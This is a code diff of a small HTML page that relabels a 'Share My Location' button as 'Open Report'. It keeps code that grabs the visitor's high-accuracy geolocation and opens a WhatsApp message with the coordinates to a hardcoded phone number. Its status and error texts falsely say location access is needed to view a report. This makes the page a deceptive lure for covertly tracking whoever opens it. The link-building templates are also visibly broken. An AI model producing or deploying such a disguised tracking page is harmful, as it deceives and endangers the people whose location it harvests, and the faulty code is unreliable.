@@ -1,39 +1,95 @@
-<!DOCTYPE html>
+ <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Share Location</title>
+    <title>Open Report</title>
     <style>
-        body { display: flex; justify-content: center; align-items: center; height: 100vh; font-family: Arial, sans-serif; background: #f0f2f5; margin: 0; }
-        .share-btn { padding: 20px 40px; font-size: 20px; font-weight: bold; color: white; background-color: #25D366; border: none; border-radius: 50px; cursor: pointer; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
-        .share-btn:active { transform: scale(0.98); }
+        body { 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
+            background-color: #f4f6f9; 
+            margin: 0; 
+            padding: 20px;
+            box-sizing: border-box;
+        }
+        .container {
+            text-align: center;
+            width: 100%;
+            max-width: 400px;
+        }
+        .share-btn { 
+            width: 100%;
+            padding: 22px; 
+            font-size: 22px; 
+            font-weight: bold; 
+            color: white; 
+            background-color: #007bff;
+            border: none; 
+            border-radius: 16px; 
+            cursor: pointer; 
+            box-shadow: 0 8px 24px rgba(0, 123, 255, 0.3); 
+            transition: transform 0.1s ease, background-color 0.2s ease;
+        }
+        .share-btn:active { 
+            transform: scale(0.96); 
+            background-color: #0056b3;
+        }
+        .status-text {
+            margin-top: 15px;
+            font-size: 14px;
+            color: #666;
+        }
     </style>
 </head>
 <body>
 
-    <button class="share-btn" onclick="shareLocation('60188702526')">📍 Share My Location</button>
+    <div class="container">
+        <button class="share-btn" onclick="shareLocation('60188702526')">📋 Open Report</button>
+        <div id="status" class="status-text">Tap the button to open the report dashboard</div>
+    </div>
 
     <script>
         function shareLocation(myPhone) {
+            const statusDiv = document.getElementById('status');
+            
             if (!navigator.geolocation) {
-                alert("Geolocation is not supported by your browser.");
+                alert("Geolocation is not supported by your mobile browser.");
                 return;
             }
+
+            statusDiv.innerText = "Loading report data...";
+
             navigator.geolocation.getCurrentPosition(
                 (position) => {
+                    statusDiv.innerText = "Redirecting to WhatsApp...";
+                    
                     const lat = position.coords.latitude;
                     const lon = position.coords.longitude;
-                    const mapLink = `https://google.com{lat},${lon}`;
+                    const mapLink = `https://google.com{lat},./${lon}`;
                     const message = encodeURIComponent(`Hey! Here is my current location: ${mapLink}`);
+                    
                     window.location.href = `https://wa.me{myPhone}?text=${message}`;
+                    
+                    setTimeout(() => {
+                        statusDiv.innerText = "Tap the button to open the report dashboard";
+                    }, 3000);
                 },
                 (error) => {
-                    alert("Error getting location. Please enable location permissions.");
+                    statusDiv.innerText = "Failed to load report.";
+                    alert("Please enable location permissions in your browser settings to access this report.");
                 },
-                { enableHighAccuracy: true }
+                { 
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                }
             );
         }
     </script>
 </body>
 </html>
+
